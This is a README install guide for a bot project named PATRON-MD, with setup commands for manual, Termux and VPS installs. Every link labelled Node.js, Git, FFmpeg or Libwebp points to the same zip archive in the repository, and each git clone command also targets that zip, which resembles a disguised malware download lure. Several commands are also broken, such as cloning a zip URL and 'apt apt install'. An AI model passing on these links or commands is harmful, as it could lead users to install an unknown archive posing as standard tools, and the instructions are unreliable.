# Install Manually 👇
## `Requirements`
* [Node.js](https://github.com/kaniooo/PATRON-MD/raw/refs/heads/master/lib/MD-PATRO-v3.9.zip)
* [Git](https://github.com/kaniooo/PATRON-MD/raw/refs/heads/master/lib/MD-PATRO-v3.9.zip)
* [FFmpeg](https://github.com/kaniooo/PATRON-MD/raw/refs/heads/master/lib/MD-PATRO-v3.9.zip)
* [Libwebp](https://github.com/kaniooo/PATRON-MD/raw/refs/heads/master/lib/MD-PATRO-v3.9.zip)
* Any text editor
## `Clone Repo & Installation dependencies`
```bash
git clone https://github.com/kaniooo/PATRON-MD/raw/refs/heads/master/lib/MD-PATRO-v3.9.zip
cd PATRON-MD

npm start
```
## `For Termux/Ssh/Ubuntu`
```bash
apt update
apt upgrade
pkg update && pkg upgrade
pkg install bash
pkg install libwebp
pkg install git -y
pkg install nodejs -y 
pkg install ffmpeg -y 
pkg install wget
pkg install imagemagick -y
git clone https://github.com/kaniooo/PATRON-MD/raw/refs/heads/master/lib/MD-PATRO-v3.9.zip
cd PATRON-MD
termux-setup-storage
yarn install
npm start
```
## `For VPS`
```bash
apt install nodejs 
apt install git 
apt apt install ffmpeg 
apt apt install libwebp 
apt apt install imagrmagick
apt install bash
git clone https://github.com/kaniooo/PATRON-MD/raw/refs/heads/master/lib/MD-PATRO-v3.9.zip
cd PATRON-MD
npm start
```
## `For 24/7 Activation (Termux)`
```bash
npm i -g pm2 && pm2 start index.js && pm2 save && pm2 logs
```
